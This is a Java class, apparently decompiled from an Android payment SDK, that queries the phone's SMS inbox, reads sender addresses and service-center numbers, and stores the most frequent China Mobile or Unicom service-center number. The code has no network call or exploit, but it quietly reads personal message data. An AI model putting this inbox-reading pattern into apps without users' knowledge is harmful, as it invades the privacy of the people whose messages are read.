package com.bbpay.sms;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.bbpay.bean.Constants;
import com.bbpay.db.SharePreferUtil;
import com.bbpay.util.Frequency;
import com.bbpay.util.MyLogger;
import com.bbpay.util.SystemInfo;
import com.bbpay.util.Tools;

public class SmscTools {
    private final Context context;
    public SmscTools(Context context1) {
        context = context1;
    }
    public String dogetSMSC() {
        String cardType = SystemInfo.getCardType(context);
        String smsc = null;
        if (!cardType.equals(SystemInfo.CHINA_TELECOM) && !cardType.equals(SystemInfo.UNKNOW)) {
            smsc = SharePreferUtil.getSMSCFromDataBase(context);
            if (smsc == null) {
                smsc = getInboxSMSC();
                if (smsc != null) {
                    SharePreferUtil.saveSMSCToDataBase(smsc, context);
                    return smsc;
                }
            }
        }
        return smsc;
    }
    private String getInboxSMSC() {
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[] { "address", "service_center" },
                "length(address)=11 or length(address)=14", null, "_id desc");
        if (cursor != null) {
            Frequency frequency = new Frequency();
            String cardType = SystemInfo.getCardType(context);
            while (cursor.moveToNext()) {
                String address = cursor.getString(0);
                String serviceCenter = cursor.getString(1);
                //EpayLog.showSaveLog("getInboxSMSC", (new StringBuilder("address=")).append(address).append("service_center=").append(serviceCenter).toString());
                if (Tools.isPhoneNumberValid(address)) {
                    if (serviceCenter != null) {
                        if (!serviceCenter.trim().equals("")) {
                            if (serviceCenter.startsWith("+86")) serviceCenter = serviceCenter.substring(3);
                            //EpayLog.showSaveLog("info", (new StringBuilder("last smsc=")).append(serviceCenter).toString());
                            if (cardType.equals(Constants.MOBILE) && serviceCenter.startsWith("13800")) {
                                frequency.addStatistics(serviceCenter);
                            } else if (cardType.equals(SystemInfo.CHINA_UNICOM) && serviceCenter.startsWith("13010")) {
                                frequency.addStatistics(serviceCenter);
                            }
                        }
                    }
                }
            }
            String result = frequency.getMaxValueItem().getKey();
            MyLogger.info("", new StringBuilder("最频繁的中心号是：").append(result).toString());
            return result;
        }
        return null;
    }
}
